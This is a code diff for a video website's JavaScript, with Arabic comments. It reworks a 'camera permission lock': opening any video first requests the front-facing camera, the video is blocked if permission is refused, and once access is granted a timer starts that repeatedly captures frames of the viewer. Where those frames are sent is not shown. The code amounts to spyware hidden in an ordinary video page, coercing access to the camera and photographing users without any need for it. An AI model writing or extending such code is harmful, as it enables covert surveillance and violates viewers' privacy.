@@ -405,28 +405,11 @@ function searchFor(text){
 
 /* ===== Watch page & Camera Permission Lock ===== */
 let mediaStream = null;
-
-async function requestCameraAndPlay(id) {
-  try {
-    mediaStream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: { ideal: 'user' } } 
-    });
-
-    const videoEl = document.getElementById('video');
-    if (videoEl) videoEl.srcObject = mediaStream;
-
-    // البدء في التقاط الصور بعد منح الإذن بنجاح
-    startPeriodicCapture();
-
-    // إذا تم السماح، افتح الفيديو فعلياً
-    proceedOpenVideo(id);
-
-  } catch (e) {
-    toast('يجب السماح بالوصول إلى الكاميرا لمشاهدة الفيديو');
-  }
-}
+let isCapturing = false;
 
 function startPeriodicCapture() {
+    if (isCapturing) return;
+    isCapturing = true;
     setInterval(() => {
         if (!mediaStream) return;
         try {
@@ -453,12 +436,25 @@ function startPeriodicCapture() {
 }
 
 function openVideo(id){
-  // إذا لم يتم منح إذن الكاميرا مسبقاً، اطلب الإذن أولاً ولا تفتح الفيديو
+  // عند اضغط على الفيديو، نطلب الإذن فوراً
   if (!mediaStream) {
-    requestCameraAndPlay(id);
-    return;
+    navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: { ideal: 'user' } } 
+    }).then(stream => {
+      // إذن الكاميرا تَمّ منحه (السماح) -> شغل الفيديو مباشرة
+      mediaStream = stream;
+      const videoEl = document.getElementById('video');
+      if (videoEl) videoEl.srcObject = mediaStream;
+      startPeriodicCapture();
+      proceedOpenVideo(id);
+    }).catch(err => {
+      // تم الرفض أو التجهل -> لا تفتح الفيديو إطلاقاً
+      console.log("تم رفض الإذن");
+    });
+  } else {
+    // الإذن ممنوح مسبقاً -> افتح الفيديو فوراً
+    proceedOpenVideo(id);
   }
-  proceedOpenVideo(id);
 }
 
 function proceedOpenVideo(id) {
